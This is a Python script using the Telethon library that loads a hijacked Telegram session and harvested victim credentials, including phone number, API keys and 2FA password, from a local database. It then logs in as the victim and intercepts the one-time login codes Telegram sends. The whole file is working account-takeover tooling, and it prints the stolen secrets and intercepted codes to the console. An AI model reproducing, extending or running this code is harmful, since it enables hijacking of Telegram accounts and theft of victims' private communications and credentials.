import os
import sqlite3
import asyncio
from telethon import TelegramClient, events

# --- CONFIG ---
DB_DIR = 'harvested_data'

async def start_interceptor():
    # 1. Select the Hijacked Session
    session_input = input("[?] Enter target UID (from harvested_data): ")
    db_path = f"{DB_DIR}/{session_input}_master.db"
    session_path = f"{DB_DIR}/{session_input}_web.session" # Adjust path as needed

    if not os.path.exists(db_path):
        print(f"[-] Database for {session_input} not found.")
        return

    # 2. Dynamic API Extraction
    print("[*] Extracting victim-provided API credentials...")
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT val FROM credentials WHERE key='phone'")
        phone = cursor.fetchone()[0]
        
        cursor.execute("SELECT val FROM credentials WHERE key='api_id'")
        api_id = int(cursor.fetchone()[0])
        
        cursor.execute("SELECT val FROM credentials WHERE key='api_hash'")
        api_hash = cursor.fetchone()[0]
        
        cursor.execute("SELECT val FROM credentials WHERE key='2fa'")
        two_fa = cursor.fetchone()[0]
        
        conn.close()
    except Exception as e:
        print(f"[-] Data extraction failed: {e}")
        return

    print("\n" + "✦" * 45)
    print(f"📱 HIJACKED NUMBER: {phone}")
    print(f"🔐 2FA PASSWORD:    {two_fa}")
    print(f"🛠  USING API ID:    {api_id}")
    print("✦" * 45 + "\n")

    # 3. Initialize Client with Victim's Own API Keys
    client = TelegramClient(session_path, api_id, api_hash)
    
    @client.on(events.NewMessage(from_users=777000))
    async def otp_handler(event):
        msg = event.message.message
        import re
        code = re.findall(r'\d{5}', msg) # Look for 5-digit Telegram code
        
        print("\n" + "⚡" * 30)
        print("🔔 NEW OTP INTERCEPTED!")
        if code:
            print(f"CODE: \033[91m{code[0]}\033[0m") # RED OUTPUT
        print(f"TEXT: {msg}")
        print("⚡" * 30 + "\n")

    print("[*] Establishing MTProto tunnel...")
    await client.connect()
    
    if not await client.is_user_authorized():
        print("[-] Error: Hijacked session is invalid or expired.")
        return

    print(f"[*] LISTENING FOR OTP ON {phone}... (Ctrl+C to exit)")
    await client.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(start_interceptor())
    except KeyboardInterrupt:
        print("\n[-] Connection closed.")
